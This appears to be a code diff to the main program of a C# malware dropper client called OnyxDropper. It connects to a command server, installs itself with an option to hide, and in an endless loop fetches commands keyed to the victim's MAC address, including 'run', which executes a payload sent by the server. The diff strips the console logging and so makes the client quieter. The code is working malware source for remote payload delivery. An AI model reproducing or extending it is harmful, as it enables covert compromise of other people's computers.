@@ -5,7 +5,6 @@ using DropperClient.Command;
 using DropperClient.Connection;
 using DropperClient.Dataparser;
 using DropperClient.Installation;
-using DropperClient.Logger;
 using DropperClient.Requests;
 using DropperClient.SystemInfoGatherer;
 using OnyxDropper.Requests;
@@ -14,24 +13,22 @@ namespace DropperClient
 {
     internal class Program
     {
-        private static readonly ILogger logger = new ConsoleLogger();
-
         private static void Main()
         {
-            var httpConnection = new ServerConnection(Settings.hostname);
+            var dropperSettings = new Settings();
+
+            var httpConnection = new ServerConnection(dropperSettings.hostname);
             var requestSender = new RequestSender(httpConnection);
 
-            if (Settings.Install)
+            if (dropperSettings.Install)
             {
-                logger.LogMessage("Installing OnyxDropper");
-                var installer = new DropperInstaller(Settings.Hide, (DropperInstaller.InstallLocation)Settings.InstallLocation);
+                var installer = new DropperInstaller(dropperSettings.Hide, (DropperInstaller.InstallLocation)dropperSettings.InstallLocation);
                 var installationThread = new Thread(() => installer.Install());
                 installationThread.Start();
             }
 
             if (!httpConnection.CanConnect())
             {
-                logger.LogMessage("Starting Unable to connect");
                 return;
             }
 
@@ -45,15 +42,12 @@ namespace DropperClient
                 }
             }
 
-            logger.LogMessage("Logged in succesfully");
-
             while (true)
             {
                 var newCommand = GetCommand(requestSender, systemInformation.MacAddress);
-                logger.LogMessage("Executing command");
                 newCommand.Execute();
 
-                Thread.Sleep(Settings.TimeOut);
+                Thread.Sleep(dropperSettings.TimeOut);
             }
         }
 
@@ -110,18 +104,15 @@ namespace DropperClient
             switch (jsonResponseData["command"])
             {
                 case "uninstall":
-                    logger.LogMessage("Got Command uninstall");
                     return new UninstallCommand();
 
                 case "run":
-                    logger.LogMessage("Got Command run");
                     var payloadData = (Dictionary<string, object>)jsonResponseData["Payload"];
                     var payload = CreatePayload(payloadData);
                     var runCommand = new RunCommand(payload);
                     return runCommand;
 
                 case "none":
-                    logger.LogMessage("Got Command none");
                     return new NoneCommand();
             }
 
